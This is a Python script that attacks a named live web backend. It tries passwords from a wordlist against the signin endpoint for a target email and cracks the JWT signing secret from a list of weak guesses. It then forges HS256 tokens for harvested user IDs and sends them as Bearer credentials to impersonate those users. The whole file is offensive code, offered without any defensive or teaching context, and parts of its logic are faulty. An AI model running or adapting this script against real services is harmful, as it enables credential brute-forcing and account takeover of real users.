import json
import jwt
import requests

url = "https://vritywire-backend.onrender.com/api/auth/signin"


secrets_list = ["secret", "123456", "password", "mysecret", "http"]

with open("wordlist.txt" , "r") as f:

     for password in f:
         print(password)

         res = requests.post(
         url, json={"email": "target@gmail.com", "password": password}
         )


token = res.json()["token"]



found_secret = None

for s in secrets_list:

  try:
    jwt.decode(token, s, algorithms=["HS256"])

    print(f"Secret found: {s}")
    found_secret = s

    break


  except jwt.exceptions.InvalidSignatureError:
    pass


if not found_secret:
  print("Secret not found in the list.")


  exit()


header = {"alg": "HS256", "typ": "JWT"}

with open("collected_ids.txt", "r") as f:

  for user_id in f:
    user_id = user_id.strip()

    if not user_id:
      continue



    payload = {"id": user_id, "email": "user2@test.com"}



    newtoken = jwt.encode(payload, found_secret, algorithm="HS256", headers=header)


    print(f"New Token for ID {user_id}: {newtoken}")

    

    headers = {"Authorization": f"Bearer {newtoken}"}

    reqs = requests.get(url, headers=headers)


    print(f"Response Status: {reqs.status_code}")
